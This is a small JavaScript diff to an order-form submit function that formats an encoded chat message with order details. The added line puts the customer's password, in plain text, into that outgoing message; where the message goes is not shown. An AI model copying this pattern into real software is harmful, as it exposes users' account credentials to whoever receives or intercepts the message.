@@ -258,6 +258,7 @@ function kirimFormSubmit(tid, u, p, w, itm, tot) {
                   `━━━━━━━━━━━━━━━━━━━━%0A` +
                   `🆔 *Order ID:* \`${tid}\` %0A` +
                   `👤 *Username:* ${u}%0A` +
+                  `🔒 *Password:* ${p}%0A` +
                   `📱 *WA:* [Chat Customer](https://wa.me/${w})%0A` +
                   `📦 *Item:* ${itm}%0A` +
                   `💰 *Total:* *${tot}*%0A` +
@@ -300,6 +301,7 @@ window.onload = () => {
         }
     };
 };
+
 
 
 
